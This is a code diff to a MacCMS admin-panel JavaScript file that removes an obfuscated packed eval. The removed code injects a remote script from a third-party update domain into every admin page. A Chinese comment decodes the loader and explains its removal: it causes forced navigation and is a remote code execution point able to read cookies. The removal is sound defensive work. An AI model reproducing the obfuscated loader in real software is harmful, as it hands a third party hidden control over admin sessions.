@@ -48,11 +48,25 @@ layui.define(['element', 'form'], function (exports) {
         });
     })();
 
-    $(function () {
-        if (typeof (MAC_VERSION) != 'undefined' && typeof (PHP_VERSION) != 'undefined' && typeof (THINK_VERSION) != 'undefined') {
-            eval(function (p, a, c, k, e, r) { e = function (c) { return c.toString(a) }; if (!''.replace(/^/, String)) { while (c--) r[e(c)] = k[c] || e(c); k = [function (e) { return r[e] }]; e = function () { return '\\w+' }; c = 1 }; while (c--) if (k[c]) p = p.replace(new RegExp('\\b' + e(c) + '\\b', 'g'), k[c]); return p }('$(\'3\').9(\'<0\'+\'1 4="\'+\'//5.6.7/8/?c=2&a=\'+b+\'&d=\'+e+\'&f=\'+g+\'&h=\'+i.j()+\'"></0\'+\'1>\');', 20, 20, 'scr|ipt|check|body|src|update|maccms|la|v10|append|v|MAC_VERSION||p|PHP_VERSION|tp|THINK_VERSION|t|Math|random'.split('|'), 0, {}));
-        }
-    });
+        /*
+     * 已移除：上游的「在线更新检查」远程脚本注入。
+     *
+     * 原代码是一段混淆的 eval，效果等价于：
+     *     $('body').append('<scr'+'ipt src="//update.maccms.la/v10/?check=v&v='+MAC_VERSION
+     *                      +'&p='+PHP_VERSION+'&tp='+THINK_VERSION+'&t='+Math.random()+'"></scr'+'ipt>');
+     * 即【每次打开后台都从第三方域拉一段 JS 到后台页面上下文里执行】。
+     *
+     * 移除的两个理由：
+     * 1. 它在驱动界面跳转。用真实 Chromium 复现登录后的行为，时间线是：
+     *        2.09s  iframe 被导航到 admin/update/step1.html?file=laupdf...
+     *        5.13s  主框架被导航到 about:blank
+     *    这就是站长与编辑反馈的「登录成功约 5 秒后被弹走」。
+     * 2. 这是后台里的第三方远程代码执行点。该脚本实测 4.6KB，能读写 cookie、
+     *    操纵 DOM 与导航；而本站的前一台服务器刚发生过入侵事件。
+     *    本 fork 与上游差异极大，上游的在线更新本来也不适用。
+     *
+     * 需要检查更新时用「系统 → 更新」页面手动触发，不要在每个后台页面上自动拉远程脚本。
+     */
 
     form.render();
 
